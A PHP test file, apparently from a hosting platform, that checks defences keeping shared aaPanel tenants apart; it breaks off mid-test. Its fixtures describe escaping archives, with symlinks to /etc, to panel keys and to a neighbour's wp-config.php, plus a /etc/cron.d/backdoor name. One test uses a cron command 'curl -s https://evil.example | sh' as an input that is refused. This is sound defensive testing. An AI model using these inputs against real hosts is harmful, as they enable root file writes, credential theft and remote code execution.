<?php

declare(strict_types=1);

use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Schema;
use Onhost\Domain\Provisioning\Models\ProviderBinding;
use Onhost\Domain\Provisioning\Models\ProviderInstance;
use Onhost\Domain\Provisioning\ProviderInstanceService;
use Onhost\Domain\Provisioning\ProviderRegistry;
use Onhost\Domain\Services\Models\Service;
use Onhost\Domain\Services\Models\ServiceStateMachine;
use Onhost\Domain\Services\Models\StagingLink;
use Onhost\Domain\Services\Web\StagingService;
use Onhost\Platform\Audit\AuditEvent;
use Onhost\Platform\Commands\CommandContext;
use Onhost\Platform\Errors\ProviderErrorCode;
use Onhost\Platform\Errors\ProviderException;
use Onhost\Providers\AaPanel\AaPanelWebProvider;
use Onhost\Providers\Contracts\Naming;
use Onhost\Providers\Contracts\ResourceRef;
use Onhost\Providers\Shell\ScriptedShell;

/*
 * A shared aaPanel node keeps its tenants apart (TASK-0034, permission program IF-7 / D11 / P0-03, exploit PA-02).
 *
 * aaPanel's file API and ExecShell run as ROOT, and every site on the node runs as the same `www`. So:
 *  - an archive unpacked by the panel (UnZip, as root) that carries a symlink out of the site, a hardlink, an absolute
 *    name or `..` wrote wherever it pointed — another customer's site, /etc, the panel's own keys;
 *  - the node shell's output and exit files, and the chunks of a download, sat in /tmp, readable by every tenant's PHP;
 *  - on a node that serves several customers, the in-panel file manager and shell cron are root I/O a tenant can steer
 *    through a link it planted. They are closed there by the operator (`operator:aapanel:tenancy --apply`), not
 *    engineered around: SFTP stays, and so do the jobs that already run as the site's own user.
 */

afterEach(function () {
    AaPanelWebProvider::$shellFactory = null;
});

/** Records every panel call; answers from `$answers` (needle => response), otherwise a plain success. */
function tenancyPanelFake(array &$calls, array $answers = []): void
{
    Http::fake(function ($request) use (&$calls, $answers) {
        $url = $request->url();
        $path = (string) parse_url($url, PHP_URL_PATH).'?'.(string) parse_url($url, PHP_URL_QUERY);
        $body = $request->data();
        if ($body === [] && preg_match_all('/name="([^"]+)"(?:; filename="[^"]*")?\r\n(?:[^\r\n]+\r\n)*\r\n(.*?)\r\n--/s', $request->body(), $parts, PREG_SET_ORDER)) {
            $body = collect($parts)->mapWithKeys(fn ($p) => [$p[1] => $p[2]])->all(); // an upload is multipart
        }
        $calls[] = [$path, $body];
        foreach ($answers as $needle => $answer) {
            if (str_contains($path, $needle)) {
                return Http::response($answer instanceof Closure ? $answer($body) : $answer);
            }
        }

        return Http::response(['status' => true, 'msg' => 'ok']);
    });
}

function tenancySite(): ResourceRef
{
    return new ResourceRef('site', '41', 'aapanel-managed01', ['name' => 'shop.cz', 'path' => '/www/wwwroot/shop.cz'], 'srv_tenancy');
}

/** Close (or reopen) the lab instance the way `--apply` records it: an option on the instance row. */
function tenancySetClosed(bool $closed): void
{
    $instance = ProviderInstance::query()->where('key', 'aapanel-managed01')->firstOrFail();
    $instance->forceFill(['options' => array_merge((array) $instance->options, ['tenancy' => ['closed' => $closed]])])->save();
}

/** One field of a recorded panel call; an upload is multipart, whose body is a list of parts. */
function tenancyPart(array $body, string $name): mixed
{
    if (array_key_exists($name, $body)) {
        return $body[$name];
    }

    return collect($body)->first(fn ($part) => is_array($part) && ($part['name'] ?? null) === $name)['contents'] ?? null;
}

/** @param list<array{0:string,1:mixed}> $calls */
function tenancyCalled(array $calls, string $needle): bool
{
    return collect($calls)->contains(fn ($c) => str_contains($c[0], $needle));
}

/** A tar report as the node-side preflight prints it (see AaPanelArchivePreflight). */
function tenancyTarShell(string $report): ScriptedShell
{
    return new ScriptedShell(['/--numeric-owner -tzvf/' => $report, '/unzip -Zs/' => $report]);
}

// ── the archive preflight: a security fix that applies on every node ─────────────────────────────────────────────

dataset('escaping archives', [
    'a symlink out of the site with a file beneath it' => ['site.tar.gz', "N 3 3\nT - 1\nT d 1\nT l 1\nL evil\t/etc\nU evil/cron.d/backdoor\n"],
    'a symlink to another customer (relative)' => ['site.tar.gz', "N 1 1\nT l 1\nL up\t../../other.cz/wp-config.php\n"],
    'a symlink to the panel (absolute)' => ['site.tar.gz', "N 1 1\nT l 1\nL keys\t/www/server/panel/config\n"],
    'a hardlink' => ['site.tar.gz', "N 2 2\nT - 1\nT h 1\n"],
    'a device node' => ['site.tar.gz', "N 1 1\nT c 1\n"],
    'an absolute name' => ['site.tar.gz', "N 1 1\nT - 1\nB /etc/cron.d/backdoor\n"],
    'a .. name' => ['site.tar.gz', "N 1 1\nT - 1\nB ../other.cz/index.php\n"],
    'a symlink in a zip' => ['site.zip', "N 1 1\nT l 1\n"],
    'a zip with a .. name' => ['site.zip', "N 1 1\nT - 1\nB ..\\other.cz\\index.php\n"],
    'a listing that does not add up' => ['site.tar.gz', "N 5 4\nT - 4\n"],
    'an archive the node cannot read' => ['site.tar.gz', "ERR\n"],
]);

it('refuses to unpack an archive whose entries would land outside the site, before the panel unpacks anything as root', function (string $archive, string $report) {
    $calls = [];
    tenancyPanelFake($calls);
    AaPanelWebProvider::$shellFactory = fn () => tenancyTarShell($report);
    $adapter = aaToolsAdapter();

    expect(fn () => $adapter->transport(tenancySite())->extract($archive, 'restore'))->toThrow(ProviderException::class);
    expect(tenancyCalled($calls, 'UnZip'))->toBeFalse(); // nothing reached the root file API
})->with('escaping archives');

it('still unpacks an ordinary site archive, links inside the site included (Laravel storage link, release switch)', function () {
    $calls = [];
    tenancyPanelFake($calls);
    $shell = tenancyTarShell("N 6 6\nT - 3\nT d 1\nT l 2\nL public/storage\t/www/wwwroot/shop.cz/storage/app/public\nL current\treleases/1\n");
    AaPanelWebProvider::$shellFactory = fn () => $shell;
    $adapter = aaToolsAdapter();

    $adapter->transport(tenancySite())->extract('site.tar.gz', '.');

    $unzip = collect($calls)->last(fn ($c) => str_contains($c[0], 'UnZip'));
    expect($unzip)->not->toBeNull()->and($unzip[1]['sfile'])->toStartWith('/www/.onhost-stage/stage-')->and($unzip[1]['dfile'])->toBe('/www/wwwroot/shop.cz');
    // the entries were listed by the node before the panel unpacked the archive, as root, from a place no tenant can read
    expect($shell->ran('--numeric-owner -tzvf'))->toBeTrue()->and($shell->ran('/root/.onhost-shell'))->toBeTrue();
});

// ── temp files of the node shell: a security fix that applies on every node ─────────────────────────────────────

it('keeps the output and exit files of the node shell where only root can read them, never in /tmp', function () {
    $calls = [];
    $lastShell = '';
    Http::fake(function ($request) use (&$calls, &$lastShell) {
        $q = (string) parse_url($request->url(), PHP_URL_QUERY);
        $body = $request->data();
        $calls[] = [$q, $body];
        if ($q === 'action=ExecShell') {
            $lastShell = (string) ($body['shell'] ?? '');

            return Http::response(['status' => true, 'msg' => 'Command sent']);
        }
        if ($q === 'action=GetFileBody') {
            return Http::response(['status' => true, 'data' => str_ends_with((string) $body['path'], '.exit') ? '0' : "hello\n"]);
        }

        return Http::response(['status' => false, 'msg' => "unexpected {$q}"]);
    });
    $adapter = aaToolsAdapter();

    expect(trim($adapter->shell(tenancySite())->run('echo hello', ['user' => 'www'])->stdout))->toBe('hello');

    $exec = collect($calls)->filter(fn ($c) => $c[0] === 'action=ExecShell')->map(fn ($c) => (string) $c[1]['shell'])->values();
    expect($exec[0])->not->toContain('/tmp/onhost-')->toContain('mkdir -p -m 700 /root/.onhost-shell')->toContain('> /root/.onhost-shell/onhost-');
    expect($exec->last())->toStartWith('rm -f /root/.onhost-shell/onhost-');
    $read = collect($calls)->filter(fn ($c) => $c[0] === 'action=GetFileBody')->map(fn ($c) => (string) $c[1]['path']);
    expect($read->every(fn ($p) => str_starts_with($p, '/root/.onhost-shell/')))->toBeTrue();
});

it('stages the chunks of a download and the files of a restore where only root can read them', function () {
    $calls = [];
    tenancyPanelFake($calls, [
        'GetFileBody' => ['status' => true, 'data' => base64_encode('hello')],
        'data?action=getData&table=backup' => ['data' => [['id' => 77, 'addtime' => '2026-09-10 02:30:00', 'size' => 1234, 'filename' => '/www/backup/site/shop.cz_20260910.zip']]],
    ]);
    $shell = new ScriptedShell(['/exec 3</' => "SIZE 5\n", '/unzip -Zs/' => "N 2 2\nT - 1\nT d 1\n"]);
    AaPanelWebProvider::$shellFactory = fn () => $shell;
    $adapter = aaToolsAdapter();
    $local = tempnam(sys_get_temp_dir(), 'tenancy');

    try {
        $adapter->transport(tenancySite())->download('wp-config.php', $local);
        expect(file_get_contents($local))->toBe('hello');
    } finally {
        @unlink($local);
    }
    $chunk = collect($shell->commands())->first(fn ($c) => str_contains($c, 'base64 -w0'));
    expect($chunk)->not->toContain('/tmp/')->toContain('> /root/.onhost-shell/dl-');
    expect(collect($calls)->first(fn ($c) => str_contains($c[0], 'GetFileBody'))[1]['path'])->toStartWith('/root/.onhost-shell/dl-');

    $adapter->restoreFromArchive(tenancySite(), '77');
    $restore = collect($shell->commands())->first(fn ($c) => str_contains($c, 'unzip -oq'));
    expect($restore)->not->toContain('/tmp/')->toContain('/www/.onhost-stage/restore-');
    expect($shell->ran('unzip -Zs'))->toBeTrue(); // the panel's archive is listed before it is unpacked, too
});

// ── the tenancy switch: only on a node the operator closed ─────────────────────────────────────────────────────

it('closes the in-panel file manager and new shell cron on a node the operator closed, with the reason', function () {
    $calls = [];
    tenancyPanelFake($calls, [
        'crontab?action=GetCrontab' => [['id' => 12, 'name' => Naming::cronLabel('srv_tenancy', 'cache'), 'type' => 'day', 'where_hour' => '3', 'where_minute' => '0', 'sBody' => 'php cron.php', 'status' => 1]],
    ]);
    AaPanelWebProvider::$shellFactory = fn () => new ScriptedShell(['/^id -u /' => "1042\n"]);
    $adapter = aaToolsAdapter();
    $site = tenancySite();
    tenancySetClosed(true);

    $features = $adapter->siteFeatures();
    expect($features['files'])->toBeFalse()->and($features['file_manager'])->toBeFalse()->and($features['files_advanced'])->toBeFalse()
        ->and($features['ftp'])->toBeTrue()->and($features['cron'])->toBeTrue(); // SFTP/FTP stays; jobs can still be listed and deleted

    foreach ([
        fn () => $adapter->writeFile($site, 'index.php', '<?php echo 1;'),
        fn () => $adapter->deleteFile($site, 'index.php'),
        fn () => $adapter->createDirectory($site, 'new'),
        fn () => $adapter->listFiles($site, ''),
        fn () => $adapter->readFile($site, 'wp-config.php'),
        fn () => $adapter->createCron($site, ['schedule' => '0 3 * * *', 'command' => 'php artisan schedule:run']),
        fn () => $adapter->updateCron($site, '12', ['command' => 'curl -s https://evil.example | sh']),
        fn () => $adapter->runCron($site, '12'),
    ] as $closed) {
        try {
            $closed();
            $this->fail('a closed shared node took the request');
        } catch (ProviderException $e) {
            expect($e->getMessage())->toContain('SFTP');
        }
    }
    foreach (['SaveFileBody', 'CreateFile', 'DeleteFile', 'CreateDir', 'GetDir', 'GetFileBody', 'AddCrontab', 'modify_crond', 'StartTask'] as $action) {
        expect(tenancyCalled($calls, $action))->toBeFalse("{$action} reached the panel");
    }

    // what stays: re-confining a job with the command it already has, pausing, deleting (the ways out)
    $adapter->updateCron($site, '12', ['command' => 'php cron.php']);
    expect(tenancyCalled($calls, 'modify_crond'))->toBeTrue();
    $adapter->setCronActive($site, '12', false);
    expect(tenancyCalled($calls, 'set_cron_status'))->toBeTrue();
    $adapter->deleteCron($site, '12');
    expect(tenancyCalled($calls, 'DelCrontab'))->toBeTrue();
});

it('leaves a node nobody closed exactly as it was', function () {
    $calls = [];
    tenancyPanelFake($calls);
    $adapter = aaToolsAdapter();

    expect($adapter->siteFeatures())->toMatchArray(['files' => true, 'file_manager' => true, 'files_advanced' => true, 'cron' => true, 'cron_edit' => true]);
    $adapter->writeFile(tenancySite(), 'index.php', '<?php echo 1;');
    expect(tenancyCalled($calls, 'SaveFileBody'))->toBeTrue();
});

it('refuses file writes and uploads through the customer API on a closed shared node', function () {
    Http::preventStrayRequests();
    Http::fake(fn () => Http::response(['status' => true, 'msg' => 'ok']));
    [$user, $org] = $this->customerWithOrganization();
    $service = featureWebService($org, 'aapanel');
    tenancySetClosed(true);
    $this->actingAs($user, 'sanctum');

    $features = $this->getJson("/v1/services/{$service->id}/features")->assertOk()->json('data');
    expect($features['features']['files']['enabled'])->toBeFalse()->and($features['features']['files_advanced']['enabled'])->toBeFalse()
        ->and($features['actions'])->not->toContain('file.save')->not->toContain('file.extract');
    $this->postJson("/v1/services/{$service->id}/actions", ['action' => 'file.save', 'params' => ['path' => 'index.php', 'content' => 'x']], ['Idempotency-Key' => 'tenancy-save'])
        ->assertUnprocessable()->assertJsonPath('error', 'feature_unavailable');
    $this->postJson("/v1/services/{$service->id}/actions", ['action' => 'file.extract', 'params' => ['path' => 'a.zip']], ['Idempotency-Key' => 'tenancy-extract'])
        ->assertUnprocessable()->assertJsonPath('error', 'feature_unavailable');
    $this->post("/v1/services/{$service->id}/files/upload", ['file' => UploadedFile::fake()->create('x.php', 1)], ['Accept' => 'application/json'])
        ->assertUnprocessable()->assertJsonPath('error', 'feature_unavailable');
    Http::assertNotSent(fn ($r) => str_contains($r->url(), 'SaveFileBody') || str_contains($r->url(), 'action=upload') || str_contains($r->url(), 'UnZip'));
});

// ── the operator command ───────────────────────────────────────────────────────────────────────────────────────

/** A second customer's site on the same node (featureWebService binds remote id 41; the row is what counts here). */
function tenancyNeighbour(Service $first, string $organizationId, string $hostname): Service
{
    $second = $first->replicate();
    $second->forceFill(['organization_id' => $organizationId, 'hostname' => $hostname, 'name_prefix' => null])->save();

    return $second;
}

it('lists the aaPanel nodes several customers share and what closing them takes away, changing nothing (dry run)', function () {
    [, $orgA] = $this->customerWithOrganization();
    [, $orgB] = $this->customerWithOrganization(['email' => 'second@example.test'], ['name' => 'Druhá s.r.o.']);
    $first = featureWebService($orgA, 'aapanel');
    tenancyNeighbour($first, $orgB->id, 'other.cz');
    // a node only one customer uses is not shared
    $solo = ProviderInstance::query()->create(['key' => 'aapanel-solo', 'provider' => 'aapanel', 'name' => 'solo', 'region_code' => 'cz1', 'base_url' => 'https://solo.mgmt.test:8888', 'secret_ref' => 'env://AAPANEL_SOLO', 'state' => 'active', 'capabilities' => ['web.create' => true], 'options' => []]);
    $first->replicate()->forceFill(['provider_instance_id' => $solo->id, 'hostname' => 'solo.cz', 'name_prefix' => null])->save();
    $audits = DB::table('audit_events')->count();

    $this->artisan('operator:aapanel:tenancy')
        ->expectsOutputToContain('aapanel-managed01')->expectsOutputToContain('shop.cz')->expectsOutputToContain('other.cz')
        ->expectsOutputToContain('Druhá s.r.o.')->expectsOutputToContain('SFTP')->expectsOutputToContain('--apply')
        ->doesntExpectOutputToContain('solo.cz')->assertExitCode(0);

    expect(ProviderInstance::query()->where('key', 'aapanel-managed01')->first()->option('tenancy.closed'))->toBeNull();
    expect(DB::table('audit_events')->count())->toBe($audits);
});

it('closes the shared nodes on --apply through the command bus, and reopens one on --reopen', function () {
    Http::fake(fn () => Http::response(['status' => true, 'msg' => 'ok']));
    [, $orgA] = $this->customerWithOrganization();
    [, $orgB] = $this->customerWithOrganization(['email' => 'second@example.test']);
    $first = featureWebService($orgA, 'aapanel');
    tenancyNeighbour($first, $orgB->id, 'other.cz');

    $this->artisan('operator:aapanel:tenancy --apply')->expectsOutputToContain('closed')->assertExitCode(0);

    $instance = ProviderInstance::query()->where('key', 'aapanel-managed01')->firstOrFail();
    expect($instance->option('tenancy.closed'))->toBeTrue()->and($instance->option('tenancy.organizations'))->toBe(2)
        ->and($instance->option('verify_tls'))->toBeFalse(); // the other options of the instance are kept
    expect(DB::table('audit_events')->where('action', 'provisioning.instance.upsert')->where('result', 'succeeded')->exists())->toBeTrue();
    app(ProviderRegistry::class)->forget($instance);
    expect(fn () => aaToolsAdapter()->writeFile(tenancySite(), 'index.php', 'x'))->toThrow(ProviderException::class);

    // again: nothing more to do, nothing written twice
    $writes = DB::table('audit_events')->where('action', 'provisioning.instance.upsert')->count();
    $this->artisan('operator:aapanel:tenancy --apply')->expectsOutputToContain('already closed')->assertExitCode(0);
    expect(DB::table('audit_events')->where('action', 'provisioning.instance.upsert')->count())->toBe($writes);

    $this->artisan('operator:aapanel:tenancy --reopen')->assertExitCode(1); // reopening names the node
    $this->artisan('operator:aapanel:tenancy --reopen --instance=aapanel-managed01')->expectsOutputToContain('reopened')->assertExitCode(0);
    expect(ProviderInstance::query()->where('key', 'aapanel-managed01')->first()->option('tenancy.closed'))->toBeFalse();
});

// ── review round 1 (TASK-0034): what the first version still left open ────────────────────────────────────────

dataset('archives the tenant can still change', [
    'a link to a file outside the site (a neighbour\'s backup)' => ["S outside\n"],
    'not a regular file' => ["S kind\n"],
    'a second name of another file (hardlink)' => ["S links\n"],
    'gone before it could be opened' => ["S missing\n"],
    'unpacked into a folder that leads out of the site' => ["S target\n"],
]);

it('refuses an archive in the site that is a link, a hardlink or not a file, before root reads it', function (string $report) {
    $calls = [];
    tenancyPanelFake($calls);
    $shell = tenancyTarShell($report);
    AaPanelWebProvider::$shellFactory = fn () => $shell;
    $adapter = aaToolsAdapter();

    expect(fn () => $adapter->transport(tenancySite())->extract('site.tar.gz', '.'))->toThrow(ProviderException::class);
    expect(tenancyCalled($calls, 'UnZip'))->toBeFalse();
    expect($shell->ran("rm -f '/www/.onhost-stage/stage-"))->toBeTrue(); // the half-made copy does not stay behind
})->with('archives the tenant can still change');

it('judges and unpacks a copy the tenant cannot touch, never the archive in the site (the swap between check and unpack)', function () {
    $calls = [];
    tenancyPanelFake($calls);
    $shell = tenancyTarShell("N 2 2\nT - 1\nT d 1\n");
    AaPanelWebProvider::$shellFactory = fn () => $shell;
    $adapter = aaToolsAdapter();

    $adapter->transport(tenancySite())->extract('site.tar.gz', 'restore');

    $stage = collect($shell->commands())->first(fn ($c) => str_contains($c, '-tzvf'));
    // one root step: open the file once, prove what was opened lies in the site and is a single-named regular file,
    // copy exactly that into the root-only stage, then list the copy
    expect($stage)->toContain('exec 3<')->toContain('/proc/self/fd/3')->toContain("realpath -e -- '/www/wwwroot/shop.cz'")
        ->toContain('cat <&3 >')->toContain('mkdir -p -m 700 /www/.onhost-stage');
    expect(strpos($stage, 'cat <&3'))->toBeLessThan(strpos($stage, '-tzvf'));
    $unzip = collect($calls)->last(fn ($c) => str_contains($c[0], 'UnZip'));
    expect($unzip[1]['sfile'])->toStartWith('/www/.onhost-stage/stage-')->toEndWith('.tar.gz')->and($unzip[1]['dfile'])->toBe('/www/wwwroot/shop.cz/restore');
    expect($shell->ran("rm -f '".$unzip[1]['sfile']."'"))->toBeTrue();
});

it('unpacks as the site user on a closed shared node: root writes only into its own folder, never through a planted link', function () {
    $calls = [];
    tenancyPanelFake($calls);
    $shell = tenancyTarShell("N 2 2\nT - 1\nT d 1\n");
    AaPanelWebProvider::$shellFactory = fn () => $shell;
    $adapter = aaToolsAdapter();
    tenancySetClosed(true);

    $adapter->transport(tenancySite())->extract('onhost-restore-ab12cd.tar.gz', '.'); // what a backup restore does

    expect(tenancyCalled($calls, 'UnZip'))->toBeFalse(); // the panel's root unpack writes through links in the site
    $unpack = collect($shell->commands())->first(fn ($c) => str_contains($c, '-xzf'));
    // since review round 3 the site user does the whole unpack; root only hands over the copy it judged
    expect($unpack)->toStartWith("su -s /bin/bash 'ohenancyag' -c ")->toContain('--exclude=./.user.ini')->toContain("< '/www/.onhost-stage/stage-");
    expect($shell->ran("rm -f '/www/.onhost-stage/stage-"))->toBeTrue();
});

it('refuses a malicious backup archive before restoring it over the site', function (string $archive, string $report) {
    $calls = [];
    tenancyPanelFake($calls, ['data?action=getData&table=backup' => ['data' => [['id' => 77, 'addtime' => '2026-09-10 02:30:00', 'size' => 1234, 'filename' => '/www/backup/site/'.$archive]]]]);
    $shell = tenancyTarShell($report);
    AaPanelWebProvider::$shellFactory = fn () => $shell;
    $adapter = aaToolsAdapter();

    expect(fn () => $adapter->restoreFromArchive(tenancySite(), '77'))->toThrow(ProviderException::class);
    expect($shell->ran('unzip -oq'))->toBeFalse()->and($shell->ran('-xzf'))->toBeFalse()->and($shell->ran('rsync'))->toBeFalse();
})->with('escaping archives');

it('restores a backup as the site user on a closed shared node, and unpacks a tar.gz backup with tar', function () {
    $calls = [];
    tenancyPanelFake($calls, ['data?action=getData&table=backup' => ['data' => [['id' => 77, 'addtime' => '2026-09-10 02:30:00', 'size' => 1234, 'filename' => '/www/backup/site/shop.cz_20260910.tar.gz']]]]);
    $shell = tenancyTarShell("N 2 2\nT - 1\nT d 1\n");
    AaPanelWebProvider::$shellFactory = fn () => $shell;
    $adapter = aaToolsAdapter();
    tenancySetClosed(true);

    $adapter->restoreFromArchive(tenancySite(), '77');

    $restore = collect($shell->commands())->first(fn ($c) => str_contains($c, '-xzf'));
    expect($restore)->not->toBeNull()->not->toContain('unzip -oq')->not->toContain('rsync')->not->toContain('chown -R')
        ->toStartWith("su -s /bin/bash 'ohenancyag' -c "); // the whole unpack as the site user (review round 3)
});

it('never copies anything into the site after an unpack that failed (a lone `src=` let the root rsync copy "/" there)', function () {
    $calls = [];
    tenancyPanelFake($calls, ['data?action=getData&table=backup' => ['data' => [['id' => 77, 'addtime' => '2026-09-10 02:30:00', 'size' => 1234, 'filename' => '/www/backup/site/shop.cz_20260910.zip']]]]);
    $shell = tenancyTarShell("N 2 2\nT - 1\nT d 1\n");
    AaPanelWebProvider::$shellFactory = fn () => $shell;

    aaToolsAdapter()->restoreFromArchive(tenancySite(), '77');

    $restore = collect($shell->commands())->first(fn ($c) => str_contains($c, 'unzip -oq'));
    // the copy is reached only through `&&` from the unpack; `src` is set inside a group, never as a `;` statement
    expect($restore)->toContain(' -d "$T" && { src="$T"; if [ -d "$src/shop.cz" ]; then src="$src/shop.cz"; fi; } && { if command -v rsync')
        ->not->toContain('src=\'');
});

it('closes PHP settings and one-click apps on a closed shared node: both are root writes into the site', function () {
    $calls = [];
    tenancyPanelFake($calls);
    AaPanelWebProvider::$shellFactory = fn () => new ScriptedShell;
    $adapter = aaToolsAdapter();
    tenancySetClosed(true);

    expect($adapter->siteFeatures())->toMatchArray(['php_settings' => false, 'apps' => false]);
    foreach ([
        fn () => $adapter->phpSettings(tenancySite()),
        fn () => $adapter->setPhpSettings(tenancySite(), ['memory_limit' => '256M']),
        fn () => $adapter->installApp(tenancySite(), ['name' => 'wordpress']),
    ] as $closed) {
        expect($closed)->toThrow(ProviderException::class, 'SFTP');
    }
    foreach (['GetFileBody', 'SaveFileBody', 'SetupPackage'] as $action) {
        expect(tenancyCalled($calls, $action))->toBeFalse("{$action} reached the panel");
    }
});

it('refuses rather than trusts an old copy when it cannot read whether the node is closed', function () {
    $calls = [];
    tenancyPanelFake($calls);
    $adapter = aaToolsAdapter(); // built while the node was open
    Schema::rename('provider_instances', 'provider_instances_away');
    try {
        expect(fn () => $adapter->writeFile(tenancySite(), 'index.php', 'x'))
            ->toThrow(fn (ProviderException $e) => expect($e->errorCode)->toBe(ProviderErrorCode::TRANSIENT));
        expect($adapter->siteFeatures()['files'])->toBeFalse();
    } finally {
        Schema::rename('provider_instances_away', 'provider_instances');
    }
    expect(tenancyCalled($calls, 'SaveFileBody'))->toBeFalse();
});

it('keeps a closed node closed when staff edit the instance without naming tenancy, and audits a change of it', function () {
    aaToolsAdapter();
    tenancySetClosed(true);
    $instances = app(ProviderInstanceService::class);
    $instance = ProviderInstance::query()->where('key', 'aapanel-managed01')->firstOrFail();

    $instances->upsert(['key' => $instance->key, 'provider' => 'aapanel', 'base_url' => $instance->base_url, 'options' => ['verify_tls' => false]], CommandContext::system('test'));

    expect($instance->fresh()->option('tenancy.closed'))->toBeTrue()->and($instance->fresh()->option('verify_tls'))->toBeFalse();

    $instances->upsert(['key' => $instance->key, 'provider' => 'aapanel', 'base_url' => $instance->base_url, 'options' => ['tenancy' => ['closed' => false]]], CommandContext::system('test'));

    expect($instance->fresh()->option('tenancy.closed'))->toBeFalse();
    $audit = AuditEvent::query()->where('action', 'provider.instance.update')->orderByDesc('created_at')->orderByDesc('id')->firstOrFail();
    expect(data_get($audit->detail, 'tenancy.from.closed'))->toBeTrue()->and(data_get($audit->detail, 'tenancy.to.closed'))->toBeFalse()
        ->and(data_get($audit->detail, 'options_changed'))->toContain('tenancy');
});

it('closes a node the dry run did not list only on --apply --instance --force (one customer beside historical sites)', function () {
    Http::fake(fn () => Http::response(['status' => true, 'msg' => 'ok']));
    [, $org] = $this->customerWithOrganization();
    featureWebService($org, 'aapanel');

    $this->artisan('operator:aapanel:tenancy --apply --instance=aapanel-managed01')->expectsOutputToContain('Nothing to close')->assertExitCode(0);
    expect(ProviderInstance::query()->where('key', 'aapanel-managed01')->first()->option('tenancy.closed'))->toBeNull();
    $this->artisan('operator:aapanel:tenancy --apply --force')->assertExitCode(1); // never in bulk
    $this->artisan('operator:aapanel:tenancy --force --instance=aapanel-managed01')->assertExitCode(1); // only with --apply

    $this->artisan('operator:aapanel:tenancy --apply --force --instance=aapanel-managed01')->expectsOutputToContain('closed')->assertExitCode(0);
    expect(ProviderInstance::query()->where('key', 'aapanel-managed01')->first()->option('tenancy.closed'))->toBeTrue();
});

it('refuses an unknown instance key instead of doing nothing', function () {
    $this->artisan('operator:aapanel:tenancy --instance=does-not-exist')->expectsOutputToContain('does-not-exist')->assertExitCode(1);
    $this->artisan('operator:aapanel:tenancy --apply --instance=does-not-exist')->assertExitCode(1);
    $this->artisan('operator:aapanel:tenancy --reopen --instance=does-not-exist')->assertExitCode(1);
});

// ── review round 2 (TASK-0034): root reads by name, the transport's own gate, deploy/staging, write races ─────────

dataset('files the tenant swapped for something else before root read it', [
    'a link to a file outside the site (/root/.my.cnf, a neighbour\'s wp-config.php)' => ["S outside\n", ProviderErrorCode::VALIDATION],
    'not a regular file' => ["S kind\n", ProviderErrorCode::VALIDATION],
    'a second name of another file (hardlink)' => ["S links\n", ProviderErrorCode::VALIDATION],
    'gone' => ["S missing\n", ProviderErrorCode::NOT_FOUND],
]);

it('reads a download from a copy of the one file it opened, and refuses a link out of the site before root reads it', function (string $report, ProviderErrorCode $code) {
    $calls = [];
    tenancyPanelFake($calls, ['GetFileBody' => ['status' => true, 'data' => base64_encode('secret')]]);
    $shell = new ScriptedShell(['/exec 3</' => $report]);
    AaPanelWebProvider::$shellFactory = fn () => $shell;
    $local = tempnam(sys_get_temp_dir(), 'tenancy');

    try {
        expect(fn () => aaToolsAdapter()->transport(tenancySite())->download('onhost-final-abc123.tar.gz', $local))
            ->toThrow(fn (ProviderException $e) => expect($e->errorCode)->toBe($code));
        expect((string) file_get_contents($local))->toBe('');
    } finally {
        @unlink($local);
    }
    expect(tenancyCalled($calls, 'GetFileBody'))->toBeFalse()->and($shell->ran('base64 -w0'))->toBeFalse(); // nothing of it was read
    expect($shell->ran("rm -f '/www/.onhost-stage/get-"))->toBeTrue();
})->with('files the tenant swapped for something else before root read it');

it('proves what it opened before a download: in the site, a regular file with one name, copied where no tenant can reach', function () {
    $calls = [];
    tenancyPanelFake($calls, ['GetFileBody' => ['status' => true, 'data' => base64_encode('hello')]]);
    $shell = new ScriptedShell(['/exec 3</' => "SIZE 5\n"]);
    AaPanelWebProvider::$shellFactory = fn () => $shell;
    $local = tempnam(sys_get_temp_dir(), 'tenancy');

    try {
        aaToolsAdapter()->transport(tenancySite())->download('.onhost-sync.tar.gz', $local);
        expect(file_get_contents($local))->toBe('hello');
    } finally {
        @unlink($local);
    }
    $copy = collect($shell->commands())->first(fn ($c) => str_contains($c, 'exec 3<'));
    expect($copy)->toContain("realpath -e -- '/www/wwwroot/shop.cz'")->toContain('/proc/self/fd/3')->toContain('stat -L -c %h')->toContain('in www|oh*ag) ;;')
        ->toContain('/www/.onhost-stage/get-')->not->toContain('tail -c');
    $chunk = collect($shell->commands())->first(fn ($c) => str_contains($c, 'base64 -w0'));
    expect($chunk)->toContain('/www/.onhost-stage/get-')->not->toContain('/www/wwwroot/shop.cz'); // the chunks come from the copy, never the name
    expect($shell->ran("rm -f '/www/.onhost-stage/get-"))->toBeTrue();
});

it('refuses the root file API at the transport itself on a closed node, also for work queued before --apply', function () {
    $calls = [];
    tenancyPanelFake($calls);
    $shell = new ScriptedShell;
    AaPanelWebProvider::$shellFactory = fn () => $shell;
    $transport = aaToolsAdapter()->transport(tenancySite()); // built while the node was open, like a queued operation
    tenancySetClosed(true);

    foreach ([
        fn () => $transport->list(''),
        fn () => $transport->read('wp-config.php'),
        fn () => $transport->write('.onhost/deploy_key', 'key'),
        fn () => $transport->mkdir('.onhost/releases'),
        fn () => $transport->rename('a', 'b'),
        fn () => $transport->copy('wp-content', 'backup'),
        fn () => $transport->chmod('.onhost/deploy_key', 0600),
        fn () => $transport->archive(['.'], 'onhost-final-abc123.tar.gz'),
    ] as $closed) {
        expect($closed)->toThrow(ProviderException::class, 'SFTP');
    }
    foreach (['GetDir', 'GetFileBody', 'SaveFileBody', 'CreateFile', 'CreateDir', 'MvFile', 'SetFileAccess', 'files?action=Zip'] as $action) {
        expect(tenancyCalled($calls, $action))->toBeFalse("{$action} reached the panel");
    }
    expect($shell->ran('cp -a'))->toBeFalse();

    Schema::rename('provider_instances', 'provider_instances_away');
    try {
        expect(fn () => $transport->write('index.php', 'x'))->toThrow(fn (ProviderException $e) => expect($e->errorCode)->toBe(ProviderErrorCode::TRANSIENT));
    } finally {
        Schema::rename('provider_instances_away', 'provider_instances');
    }
});

it('uploads and deletes as the site\'s own shell user on a closed node: root writes only into its private folder', function () {
    $calls = [];
    tenancyPanelFake($calls);
    $shell = new ScriptedShell;
    AaPanelWebProvider::$shellFactory = fn () => $shell;
    $transport = aaToolsAdapter()->transport(tenancySite());
    tenancySetClosed(true);
    $local = tempnam(sys_get_temp_dir(), 'tenancy');
    file_put_contents($local, 'backup bytes');

    try {
        $transport->upload('onhost-restore-ab12cd.tar.gz', $local); // what a restore, an archive restore and a migration do
    } finally {
        @unlink($local);
    }
    $upload = collect($calls)->first(fn ($c) => str_contains($c[0], 'action=upload'));
